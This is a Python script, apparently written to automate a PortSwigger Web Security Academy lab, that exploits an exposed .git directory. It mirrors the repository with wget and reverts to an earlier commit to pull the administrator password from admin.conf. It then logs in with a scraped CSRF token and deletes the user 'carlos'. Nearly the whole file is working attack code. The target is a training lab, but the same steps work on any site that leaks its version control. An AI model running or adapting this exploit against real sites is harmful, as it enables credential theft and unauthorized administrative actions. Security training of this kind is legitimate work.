"""
    Lab: Information disclosure in version control history

    This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos.
	
    Exploit Steps:
	1. Fetch the .git directory
	2. Reset to the previous commit
	3. Get the administrator password from the admin.conf file
	4. Login as administrator
	5. Delete carlos
	
	Author: N00BCYB0T
"""
import requests
import re
from colorama import Fore
import os
import argparse

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://lab.web-security-academy.net)')
	parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
	args = parser.parse_args()
	lab_domain = args.url.replace('https://', '').replace('http://', '').rstrip('/')

	session = requests.Session()
	if args.proxy:
		session.proxies = {
			"http": args.proxy,
			"https": args.proxy
		}
	session.verify = False

	print(f"{Fore.YELLOW}⦗1⦘ Fetching .git directory (wait a minute).. {Fore.RESET}")
	os.system(f"C:\\wget\\wget.exe -r https://{lab_domain}/.git")

	print(f"{Fore.WHITE}⦗2⦘ Changing current working directory.. {Fore.RESET}", end="", flush=True)
	os.chdir(lab_domain)
	print(f"{Fore.GREEN}OK{Fore.RESET}")

	os.system("git reset --hard HEAD~1")
	print(f"{Fore.WHITE}⦗3⦘ Resetting to the previous commit.. {Fore.GREEN}OK{Fore.RESET}")

	print(f"{Fore.WHITE}⦗4⦘ Reading admin.conf file.. {Fore.RESET}", end="", flush=True)
	admin_conf = open("admin.conf").readline()
	print(f"{Fore.GREEN}OK{Fore.RESET}")

	print(f"{Fore.WHITE}⦗5⦘ Extracting the administrator password.. {Fore.RESET}", end="", flush=True)
	first_line = admin_conf.splitlines()[0]
	admin_pass = first_line.split("=")[1]
	print(f"{Fore.GREEN}OK{Fore.WHITE} => {Fore.YELLOW}{admin_pass}")

	print(f"{Fore.WHITE}⦗6⦘ Logging in as administrator.. ", end="", flush=True)
	session = login(session, lab_domain, admin_pass)
	print(f"{Fore.GREEN}OK{Fore.RESET}")

	print(f"{Fore.WHITE}⦗7⦘ Deleting carlos.. ", end="", flush=True)
	delete_user(session, lab_domain, "carlos")
	print(f"{Fore.GREEN}🗹 The Lab was solved!{Fore.RESET}")

def fetch(path, lab_domain, session, **kwargs):
	try:
		return session.get(f"https://{lab_domain}{path}", **kwargs)
	except Exception as e:
		print(Fore.RED + f"⦗!⦘ Failed to fetch {path}: {e}")
		exit(1)

def login(session, lab_domain, admin_pass):
	login_page = fetch("/login", lab_domain, session)
	csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
	data = { "username": "administrator", "password": admin_pass, "csrf": csrf }
	resp = session.post(f"https://{lab_domain}/login", data=data, allow_redirects=False)
	if "session" in resp.cookies:
		session.cookies.set("session", resp.cookies.get("session"))
	return session

def delete_user(session, lab_domain, username):
	fetch(f"/admin/delete?username={username}", lab_domain, session)

if __name__ == "__main__":
	main()
